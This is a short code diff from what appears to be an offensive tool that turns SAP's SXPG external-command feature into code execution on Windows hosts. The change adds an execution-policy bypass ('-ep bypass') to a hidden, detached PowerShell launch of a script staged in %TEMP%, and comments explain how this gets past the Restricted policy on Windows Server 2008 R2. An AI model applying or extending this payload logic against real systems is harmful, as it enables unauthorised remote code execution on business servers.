@@ -467,7 +467,10 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
                           "-join(gc \\\"" + sxpg_tmp_ps + "\\\"))))\"")
     # Final execute step: launch .ps1 detached so cmd.exe (and SXPG) return
     # immediately without waiting for the shell session to end.
-    sxpg_final_params = "/C start /B powershell.exe -nop -File %TEMP%\\s.ps1"
+    # -ep bypass overrides the execution policy (Restricted by default on
+    # Windows Server 2008 R2) which would otherwise block loading .ps1 files.
+    # Inline -c commands are never blocked, only -File; so only this step needs it.
+    sxpg_final_params = "/C start /B powershell.exe -nop -ep bypass -File %TEMP%\\s.ps1"
     assert len(sxpg_decode_params) <= 255, (
         f"SXPG decode params too long: {len(sxpg_decode_params)}")
     assert len(sxpg_final_params)  <= 255, (
